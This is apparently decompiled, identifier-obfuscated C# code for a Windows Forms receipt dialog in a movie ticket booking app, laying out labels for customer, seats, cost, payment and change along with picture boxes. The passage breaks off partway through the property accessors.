using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Dz5;
using Microsoft.VisualBasic.CompilerServices;
using i9M;

namespace Rs7;

[DesignerGenerated]
public class Kx5 : Form
{
	private Label _lblChange;

	private Label _lblSeats;

	private Label _Label15;

	private Label _Label8;

	private Label _Label3;

	private Label _Label2;

	private Label _Label1;

	private Label _Label6;

	private PictureBox _PictureBox14;

	private PictureBox _PictureBox13;

	private PictureBox _PictureBox12;

	private PictureBox _PictureBox8;

	private PictureBox _PictureBox7;

	private PictureBox _PictureBox6;

	private PictureBox _PictureBox3;

	private PictureBox _PictureBox2;

	private PictureBox _PictureBox1;

	public int MytotalCost;

	public int MytotalPayment;

	public int MyChange;

	public int MySeats;

	public string MycustomerID;

	public string MyfirstName;

	internal IContainer y;

	internal GroupBox H;

	internal Label L;

	internal Label a;

	internal Label R;

	internal Label E;

	internal Label B;

	internal Label K;

	internal Label s;

	internal PictureBox i;

	internal PictureBox Q;

	internal PictureBox t;

	internal PictureBox f;

	internal PictureBox g;

	internal PictureBox D;

	internal PictureBox O;

	internal PictureBox w;

	internal PictureBox v;

	internal PictureBox n;

	internal PictureBox J;

	public Kx5()
	{
		((Form)this).add_Load((EventHandler)a8Q);
		Pg7();
	}

	protected override void Ya6(bool k5A)
	{
		try
		{
			if (k5A && y != null)
			{
				y.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(k5A);
		}
	}

	private void Pg7()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_0456: Unknown result type (might be due to invalid IL or missing references)
		//IL_0460: Expected O, but got Unknown
		//IL_04da: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e4: Expected O, but got Unknown
		//IL_055e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0568: Expected O, but got Unknown
		//IL_05df: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e9: Expected O, but got Unknown
		//IL_0660: Unknown result type (might be due to invalid IL or missing references)
		//IL_066a: Expected O, but got Unknown
		//IL_06e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06eb: Expected O, but got Unknown
		//IL_0761: Unknown result type (might be due to invalid IL or missing references)
		//IL_076b: Expected O, but got Unknown
		//IL_0a97: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa1: Expected O, but got Unknown
		//IL_0b1d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b27: Expected O, but got Unknown
		//IL_0b8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b96: Expected O, but got Unknown
		//IL_0bfe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c08: Expected O, but got Unknown
		//IL_0c70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c7a: Expected O, but got Unknown
		//IL_0ce2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cec: Expected O, but got Unknown
		//IL_0d54: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d5e: Expected O, but got Unknown
		//IL_0dc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dcd: Expected O, but got Unknown
		//IL_0e32: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e3c: Expected O, but got Unknown
		//IL_0ea4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eae: Expected O, but got Unknown
		//IL_0f16: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f20: Expected O, but got Unknown
		//IL_0f88: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f92: Expected O, but got Unknown
		//IL_0ffa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1004: Expected O, but got Unknown
		//IL_1069: Unknown result type (might be due to invalid IL or missing references)
		//IL_1073: Expected O, but got Unknown
		//IL_10d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_10de: Expected O, but got Unknown
		//IL_1142: Unknown result type (might be due to invalid IL or missing references)
		//IL_114c: Expected O, but got Unknown
		//IL_11b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ba: Expected O, but got Unknown
		//IL_121e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1228: Expected O, but got Unknown
		//IL_1289: Unknown result type (might be due to invalid IL or missing references)
		//IL_1293: Expected O, but got Unknown
		//IL_12fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1304: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Kx5));
		f6P(new GroupBox());
		w0C(new Label());
		Kq3(new Label());
		k7T(new Label());
		a8G(new Label());
		q3Z(new Label());
		Yb8(new Label());
		j4C(new Label());
		Gx5(new Label());
		Bi6(new Label());
		Et2(new Label());
		b5F(new Label());
		Ea0(new Label());
		n7Q(new Label());
		q6W(new Label());
		o8S(new Label());
		Dw6(new PictureBox());
		z1N(new PictureBox());
		f0Z(new PictureBox());
		Zc4(new PictureBox());
		a0E(new PictureBox());
		d1D(new PictureBox());
		Jy4(new PictureBox());
		Cn4(new PictureBox());
		t1T(new PictureBox());
		x6C(new PictureBox());
		c3F(new PictureBox());
		a2L(new PictureBox());
		k7D(new PictureBox());
		Rw1(new PictureBox());
		b1F(new PictureBox());
		c6G(new PictureBox());
		Gs8(new PictureBox());
		m0D(new PictureBox());
		a5M(new PictureBox());
		o5Q(new PictureBox());
		((Control)Gi0()).SuspendLayout();
		((ISupportInitialize)a7F()).BeginInit();
		((ISupportInitialize)s1A()).BeginInit();
		((ISupportInitialize)j5D()).BeginInit();
		((ISupportInitialize)Ne1()).BeginInit();
		((ISupportInitialize)Gy7()).BeginInit();
		((ISupportInitialize)c2S()).BeginInit();
		((ISupportInitialize)Pr8()).BeginInit();
		((ISupportInitialize)Fz3()).BeginInit();
		((ISupportInitialize)y5M()).BeginInit();
		((ISupportInitialize)w9A()).BeginInit();
		((ISupportInitialize)Po6()).BeginInit();
		((ISupportInitialize)e0N()).BeginInit();
		((ISupportInitialize)Ce7()).BeginInit();
		((ISupportInitialize)j1N()).BeginInit();
		((ISupportInitialize)Gw3()).BeginInit();
		((ISupportInitialize)t0X()).BeginInit();
		((ISupportInitialize)k0C()).BeginInit();
		((ISupportInitialize)My7()).BeginInit();
		((ISupportInitialize)o8T()).BeginInit();
		((ISupportInitialize)z7N()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Gi0()).set_BackColor(Color.Transparent);
		((Control)Gi0()).get_Controls().Add((Control)(object)e3P());
		((Control)Gi0()).get_Controls().Add((Control)(object)i0M());
		((Control)Gi0()).get_Controls().Add((Control)(object)z4J());
		((Control)Gi0()).get_Controls().Add((Control)(object)y5J());
		((Control)Gi0()).get_Controls().Add((Control)(object)s7N());
		((Control)Gi0()).get_Controls().Add((Control)(object)r0E());
		((Control)Gi0()).get_Controls().Add((Control)(object)Rn0());
		((Control)Gi0()).get_Controls().Add((Control)(object)t8S());
		((Control)Gi0()).get_Controls().Add((Control)(object)Sz5());
		((Control)Gi0()).get_Controls().Add((Control)(object)Yy0());
		((Control)Gi0()).get_Controls().Add((Control)(object)He7());
		((Control)Gi0()).get_Controls().Add((Control)(object)Pm9());
		((Control)Gi0()).get_Controls().Add((Control)(object)d4J());
		((Control)Gi0()).get_Controls().Add((Control)(object)r8X());
		((Control)Gi0()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Gi0()).set_Location(new Point(56, 184));
		((Control)Gi0()).set_Name("GroupBox1");
		((Control)Gi0()).set_Size(new Size(296, 192));
		((Control)Gi0()).set_TabIndex(67);
		Gi0().set_TabStop(false);
		e3P().set_AutoSize(true);
		((Control)e3P()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)e3P()).set_Location(new Point(150, 164));
		((Control)e3P()).set_Name("lblChange");
		((Control)e3P()).set_Size(new Size(50, 13));
		((Control)e3P()).set_TabIndex(13);
		e3P().set_Text("Change");
		i0M().set_AutoSize(true);
		((Control)i0M()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)i0M()).set_Location(new Point(150, 140));
		((Control)i0M()).set_Name("lblTotalPayment");
		((Control)i0M()).set_Size(new Size(88, 13));
		((Control)i0M()).set_TabIndex(12);
		i0M().set_Text("Total Payment");
		z4J().set_AutoSize(true);
		((Control)z4J()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)z4J()).set_Location(new Point(150, 116));
		((Control)z4J()).set_Name("lblTotalCost");
		((Control)z4J()).set_Size(new Size(65, 13));
		((Control)z4J()).set_TabIndex(11);
		z4J().set_Text("Total Cost");
		y5J().set_AutoSize(true);
		((Control)y5J()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)y5J()).set_Location(new Point(150, 92));
		((Control)y5J()).set_Name("lblSeats");
		((Control)y5J()).set_Size(new Size(97, 13));
		((Control)y5J()).set_TabIndex(10);
		y5J().set_Text("Seats Reserved");
		s7N().set_AutoSize(true);
		((Control)s7N()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)s7N()).set_Location(new Point(150, 68));
		((Control)s7N()).set_Name("lblName");
		((Control)s7N()).set_Size(new Size(39, 13));
		((Control)s7N()).set_TabIndex(9);
		s7N().set_Text("Name");
		r0E().set_AutoSize(true);
		((Control)r0E()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)r0E()).set_Location(new Point(150, 44));
		((Control)r0E()).set_Name("lblID");
		((Control)r0E()).set_Size(new Size(72, 13));
		((Control)r0E()).set_TabIndex(8);
		r0E().set_Text("CustomerID");
		Rn0().set_AutoSize(true);
		((Control)Rn0()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Rn0()).set_Location(new Point(150, 20));
		((Control)Rn0()).set_Name("Label15");
		((Control)Rn0()).set_Size(new Size(54, 13));
		((Control)Rn0()).set_TabIndex(7);
		Rn0().set_Text("BRIGHT");
		t8S().set_AutoSize(true);
		((Control)t8S()).set_Location(new Point(36, 164));
		((Control)t8S()).set_Name("Label8");
		((Control)t8S()).set_Size(new Size(44, 13));
		((Control)t8S()).set_TabIndex(6);
		t8S().set_Text("Change");
		Sz5().set_AutoSize(true);
		((Control)Sz5()).set_Location(new Point(36, 140));
		((Control)Sz5()).set_Name("Label7");
		((Control)Sz5()).set_Size(new Size(75, 13));
		((Control)Sz5()).set_TabIndex(5);
		Sz5().set_Text("Total Payment");
		Yy0().set_AutoSize(true);
		((Control)Yy0()).set_Location(new Point(36, 116));
		((Control)Yy0()).set_Name("Label5");
		((Control)Yy0()).set_Size(new Size(55, 13));
		((Control)Yy0()).set_TabIndex(4);
		Yy0().set_Text("Total Cost");
		He7().set_AutoSize(true);
		((Control)He7()).set_Location(new Point(36, 92));
		((Control)He7()).set_Name("Label4");
		((Control)He7()).set_Size(new Size(83, 13));
		((Control)He7()).set_TabIndex(3);
		He7().set_Text("Seats Reserved");
		Pm9().set_AutoSize(true);
		((Control)Pm9()).set_Location(new Point(36, 68));
		((Control)Pm9()).set_Name("Label3");
		((Control)Pm9()).set_Size(new Size(35, 13));
		((Control)Pm9()).set_TabIndex(2);
		Pm9().set_Text("Name");
		d4J().set_AutoSize(true);
		((Control)d4J()).set_Location(new Point(36, 44));
		((Control)d4J()).set_Name("Label2");
		((Control)d4J()).set_Size(new Size(62, 13));
		((Control)d4J()).set_TabIndex(1);
		d4J().set_Text("CustomerID");
		r8X().set_AutoSize(true);
		((Control)r8X()).set_Location(new Point(36, 20));
		((Control)r8X()).set_Name("Label1");
		((Control)r8X()).set_Size(new Size(36, 13));
		((Control)r8X()).set_TabIndex(0);
		r8X().set_Text("Movie");
		Nt7().set_AutoSize(true);
		((Control)Nt7()).set_BackColor(Color.Transparent);
		((Control)Nt7()).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Nt7()).set_ForeColor(Color.White);
		((Control)Nt7()).set_Location(new Point(142, 416));
		((Control)Nt7()).set_Name("Label6");
		((Control)Nt7()).set_Size(new Size(72, 25));
		((Control)Nt7()).set_TabIndex(66);
		Nt7().set_Text("PASS");
		a7F().set_Image((Image)componentResourceManager.GetObject("PictureBox15.Image"));
		((Control)a7F()).set_Location(new Point(106, 450));
		((Control)a7F()).set_Name("PictureBox15");
		((Control)a7F()).set_Size(new Size(19, 20));
		a7F().set_TabIndex(65);
		a7F().set_TabStop(false);
		s1A().set_Image((Image)componentResourceManager.GetObject("PictureBox16.Image"));
		((Control)s1A()).set_Location(new Point(143, 450));
		((Control)s1A()).set_Name("PictureBox16");
		((Control)s1A()).set_Size(new Size(19, 20));
		s1A().set_TabIndex(64);
		s1A().set_TabStop(false);
		j5D().set_Image((Image)componentResourceManager.GetObject("PictureBox17.Image"));
		((Control)j5D()).set_Location(new Point(217, 450));
		((Control)j5D()).set_Name("PictureBox17");
		((Control)j5D()).set_Size(new Size(19, 20));
		j5D().set_TabIndex(63);
		j5D().set_TabStop(false);
		Ne1().set_Image((Image)componentResourceManager.GetObject("PictureBox18.Image"));
		((Control)Ne1()).set_Location(new Point(180, 450));
		((Control)Ne1()).set_Name("PictureBox18");
		((Control)Ne1()).set_Size(new Size(19, 20));
		Ne1().set_TabIndex(62);
		Ne1().set_TabStop(false);
		Gy7().set_Image((Image)componentResourceManager.GetObject("PictureBox19.Image"));
		((Control)Gy7()).set_Location(new Point(254, 450));
		((Control)Gy7()).set_Name("PictureBox19");
		((Control)Gy7()).set_Size(new Size(19, 20));
		Gy7().set_TabIndex(61);
		Gy7().set_TabStop(false);
		c2S().set_Image((Image)componentResourceManager.GetObject("PictureBox20.Image"));
		((Control)c2S()).set_Location(new Point(69, 450));
		((Control)c2S()).set_Name("PictureBox20");
		((Control)c2S()).set_Size(new Size(19, 20));
		c2S().set_TabIndex(60);
		c2S().set_TabStop(false);
		Pr8().set_Image((Image)componentResourceManager.GetObject("PictureBox14.Image"));
		((Control)Pr8()).set_Location(new Point(105, 386));
		((Control)Pr8()).set_Name("PictureBox14");
		((Control)Pr8()).set_Size(new Size(19, 20));
		Pr8().set_TabIndex(59);
		Pr8().set_TabStop(false);
		Fz3().set_Image((Image)componentResourceManager.GetObject("PictureBox13.Image"));
		((Control)Fz3()).set_Location(new Point(142, 386));
		((Control)Fz3()).set_Name("PictureBox13");
		((Control)Fz3()).set_Size(new Size(19, 20));
		Fz3().set_TabIndex(58);
		Fz3().set_TabStop(false);
		y5M().set_Image((Image)componentResourceManager.GetObject("PictureBox12.Image"));
		((Control)y5M()).set_Location(new Point(216, 386));
		((Control)y5M()).set_Name("PictureBox12");
		((Control)y5M()).set_Size(new Size(19, 20));
		y5M().set_TabIndex(57);
		y5M().set_TabStop(false);
		w9A().set_Image((Image)componentResourceManager.GetObject("PictureBox11.Image"));
		((Control)w9A()).set_Location(new Point(179, 386));
		((Control)w9A()).set_Name("PictureBox11");
		((Control)w9A()).set_Size(new Size(19, 20));
		w9A().set_TabIndex(56);
		w9A().set_TabStop(false);
		Po6().set_Image((Image)componentResourceManager.GetObject("PictureBox10.Image"));
		((Control)Po6()).set_Location(new Point(253, 386));
		((Control)Po6()).set_Name("PictureBox10");
		((Control)Po6()).set_Size(new Size(19, 20));
		Po6().set_TabIndex(55);
		Po6().set_TabStop(false);
		e0N().set_Image((Image)componentResourceManager.GetObject("PictureBox9.Image"));
		((Control)e0N()).set_Location(new Point(68, 386));
		((Control)e0N()).set_Name("PictureBox9");
		((Control)e0N()).set_Size(new Size(19, 20));
		e0N().set_TabIndex(54);
		e0N().set_TabStop(false);
		Ce7().set_Image((Image)componentResourceManager.GetObject("PictureBox8.Image"));
		((Control)Ce7()).set_Location(new Point(101, 6));
		((Control)Ce7()).set_Name("PictureBox8");
		((Control)Ce7()).set_Size(new Size(31, 29));
		Ce7().set_TabIndex(53);
		Ce7().set_TabStop(false);
		j1N().set_Image((Image)componentResourceManager.GetObject("PictureBox7.Image"));
		((Control)j1N()).set_Location(new Point(155, 6));
		((Control)j1N()).set_Name("PictureBox7");
		((Control)j1N()).set_Size(new Size(31, 29));
		j1N().set_TabIndex(52);
		j1N().set_TabStop(false);
		Gw3().set_Image((Image)componentResourceManager.GetObject("PictureBox6.Image"));
		((Control)Gw3()).set_Location(new Point(209, 6));
		((Control)Gw3()).set_Name("PictureBox6");
		((Control)Gw3()).set_Size(new Size(31, 29));
		Gw3().set_TabIndex(51);
		Gw3().set_TabStop(false);
		t0X().set_Image((Image)componentResourceManager.GetObject("PictureBox5.Image"));
		((Control)t0X()).set_Location(new Point(263, 6));
		((Control)t0X()).set_Name("PictureBox5");
		((Control)t0X()).set_Size(new Size(31, 29));
		t0X().set_TabIndex(50);
		t0X().set_TabStop(false);
		k0C().set_Image((Image)componentResourceManager.GetObject("PictureBox4.Image"));
		((Control)k0C()).set_Location(new Point(47, 6));
		((Control)k0C()).set_Name("PictureBox4");
		((Control)k0C()).set_Size(new Size(31, 29));
		k0C().set_TabIndex(49);
		k0C().set_TabStop(false);
		My7().set_Image((Image)componentResourceManager.GetObject("PictureBox3.Image"));
		((Control)My7()).set_Location(new Point(0, 447));
		((Control)My7()).set_Name("PictureBox3");
		((Control)My7()).set_Size(new Size(364, 29));
		My7().set_TabIndex(48);
		My7().set_TabStop(false);
		o8T().set_Image((Image)componentResourceManager.GetObject("PictureBox2.Image"));
		((Control)o8T()).set_Location(new Point(0, 382));
		((Control)o8T()).set_Name("PictureBox2");
		((Control)o8T()).set_Size(new Size(364, 29));
		o8T().set_TabIndex(47);
		o8T().set_TabStop(false);
		((Control)z7N()).set_Dock((DockStyle)1);
		((Control)z7N()).set_Location(new Point(0, 0));
		((Control)z7N()).set_Name("PictureBox1");
		((Control)z7N()).set_Size(new Size(364, 40));
		z7N().set_SizeMode((PictureBoxSizeMode)1);
		z7N().set_TabIndex(46);
		z7N().set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(364, 493));
		((Control)this).get_Controls().Add((Control)(object)Gi0());
		((Control)this).get_Controls().Add((Control)(object)Nt7());
		((Control)this).get_Controls().Add((Control)(object)a7F());
		((Control)this).get_Controls().Add((Control)(object)s1A());
		((Control)this).get_Controls().Add((Control)(object)j5D());
		((Control)this).get_Controls().Add((Control)(object)Ne1());
		((Control)this).get_Controls().Add((Control)(object)Gy7());
		((Control)this).get_Controls().Add((Control)(object)c2S());
		((Control)this).get_Controls().Add((Control)(object)Pr8());
		((Control)this).get_Controls().Add((Control)(object)Fz3());
		((Control)this).get_Controls().Add((Control)(object)y5M());
		((Control)this).get_Controls().Add((Control)(object)w9A());
		((Control)this).get_Controls().Add((Control)(object)Po6());
		((Control)this).get_Controls().Add((Control)(object)e0N());
		((Control)this).get_Controls().Add((Control)(object)Ce7());
		((Control)this).get_Controls().Add((Control)(object)j1N());
		((Control)this).get_Controls().Add((Control)(object)Gw3());
		((Control)this).get_Controls().Add((Control)(object)t0X());
		((Control)this).get_Controls().Add((Control)(object)k0C());
		((Control)this).get_Controls().Add((Control)(object)My7());
		((Control)this).get_Controls().Add((Control)(object)o8T());
		((Control)this).get_Controls().Add((Control)(object)z7N());
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Receipt3");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Receipt");
		((Control)Gi0()).ResumeLayout(false);
		((Control)Gi0()).PerformLayout();
		((ISupportInitialize)a7F()).EndInit();
		((ISupportInitialize)s1A()).EndInit();
		((ISupportInitialize)j5D()).EndInit();
		((ISupportInitialize)Ne1()).EndInit();
		((ISupportInitialize)Gy7()).EndInit();
		((ISupportInitialize)c2S()).EndInit();
		((ISupportInitialize)Pr8()).EndInit();
		((ISupportInitialize)Fz3()).EndInit();
		((ISupportInitialize)y5M()).EndInit();
		((ISupportInitialize)w9A()).EndInit();
		((ISupportInitialize)Po6()).EndInit();
		((ISupportInitialize)e0N()).EndInit();
		((ISupportInitialize)Ce7()).EndInit();
		((ISupportInitialize)j1N()).EndInit();
		((ISupportInitialize)Gw3()).EndInit();
		((ISupportInitialize)t0X()).EndInit();
		((ISupportInitialize)k0C()).EndInit();
		((ISupportInitialize)My7()).EndInit();
		((ISupportInitialize)o8T()).EndInit();
		((ISupportInitialize)z7N()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual GroupBox Gi0()
	{
		return H;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f6P(GroupBox Aj0)
	{
		GroupBox val = (H = Aj0);
	}

	[SpecialName]
	internal virtual Label e3P()
	{
		return _lblChange;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w0C(Label a7R)
	{
		_lblChange = a7R;
	}

	[SpecialName]
	internal virtual Label i0M()
	{
		return L;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kq3(Label Nd5)
	{
		Label val = (L = Nd5);
	}

	[SpecialName]
	internal virtual Label z4J()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k7T(Label g8B)
	{
		Label val = (a = g8B);
	}

	[SpecialName]
	internal virtual Label y5J()
	{
		return _lblSeats;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a8G(Label Ax1)
	{
		_lblSeats = Ax1;
	}

	[SpecialName]
	internal virtual Label s7N()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q3Z(Label y6F)
	{
		Label val = (R = y6F);
	}

	[SpecialName]
	internal virtual Label r0E()
	{
		return E;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yb8(Label r2A)
	{
		Label val = (E = r2A);
	}

	[SpecialName]
	internal virtual Label Rn0()
	{
		return _Label15;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j4C(Label y1F)
	{
		_Label15 = y1F;
	}

	[SpecialName]
	internal virtual Label t8S()
	{
		return _Label8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gx5(Label Ji2)
	{
		_Label8 = Ji2;
	}

	[SpecialName]
	internal virtual Label Sz5()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bi6(Label Jq1)
	{
		Label val = (B = Jq1);
	}

	[SpecialName]
	internal virtual Label Yy0()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Et2(Label Pt0)
	{
		Label val = (K = Pt0);
	}

	[SpecialName]
	internal virtual Label He7()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b5F(Label i3W)
	{
		Label val = (s = i3W);
	}

	[SpecialName]
	internal virtual Label Pm9()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ea0(Label Rg8)
	{
		_Label3 = Rg8;
	}

	[SpecialName]
	internal virtual Label d4J()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void n7Q(Label t3G)
	{
		_Label2 = t3G;
	}

	[SpecialName]
	internal virtual Label r8X()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q6W(Label d0Q)
	{
		_Label1 = d0Q;
	}

	[SpecialName]
	internal virtual Label Nt7()
	{
		return _Label6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o8S(Label Dt9)
	{
		_Label6 = Dt9;
	}

	[SpecialName]
	internal virtual PictureBox a7F()
	{
		return i;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Dw6(PictureBox o6T)
	{
		PictureBox val = (i = o6T);
	}

	[SpecialName]
	internal virtual PictureBox s1A()
	{
		return Q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z1N(PictureBox p3W)
	{
		PictureBox val = (Q = p3W);
	}

	[SpecialName]
	internal virtual PictureBox j5D()
	{
		return t;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f0Z(PictureBox Rs9)
	{
		PictureBox val = (t = Rs9);
	}

	[SpecialName]
	internal virtual PictureBox Ne1()
	{
		return f;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zc4(PictureBox Mn1)
	{
		PictureBox val = (f = Mn1);
	}

	[SpecialName]
	internal virtual PictureBox Gy7()
	{
		return g;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a0E(PictureBox t3G)
	{
		PictureBox val = (g = t3G);
	}

	[SpecialName]
	internal virtual PictureBox c2S()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d1D(PictureBox k1X)
	{
		PictureBox val = (D = k1X);
	}

	[SpecialName]
	internal virtual PictureBox Pr8()
	{
		return _PictureBox14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jy4(PictureBox o0A)
	{
		_PictureBox14 = o0A;
	}

	[SpecialName]
	internal virtual PictureBox Fz3()
	{
		return _PictureBox13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cn4(PictureBox Zk0)
	{
		_PictureBox13 = Zk0;
	}

	[SpecialName]
	internal virtual PictureBox y5M()
	{
		return _PictureBox12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
